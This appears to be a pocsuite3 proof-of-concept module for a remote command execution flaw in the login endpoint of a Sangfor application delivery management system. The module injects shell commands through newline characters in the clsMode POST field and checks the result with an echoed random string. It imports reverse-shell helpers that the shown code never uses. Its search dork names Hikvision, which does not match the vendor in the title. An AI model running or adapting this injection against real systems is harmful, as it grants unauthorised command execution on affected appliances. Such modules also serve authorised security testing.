from urllib.parse import urljoin

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)

minimum_version_required('1.9.11')


class POC(POCBase):
    name = '深信服 应用交付管理系统 login 远程命令执行漏洞'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': 'app:"Hikvision" +title:"综合安防管理平台"'}

    def _exploit(self, param=''):
        data = f"""clsMode=cls_mode_login%0A{param}%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"""
        url = urljoin(self.url, '/rep/login')
        res = requests.post(url, data=data, verify=False, timeout=5)
        return res.text

    def _verify(self):
        result = {}
        random_payload = random_str(6)
        param = f'echo {random_payload}'
        res = self._exploit(param)
        if random_payload in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
            result['VerifyInfo']['payload'] = param
        return self.parse_output(result)


register_poc(POC)
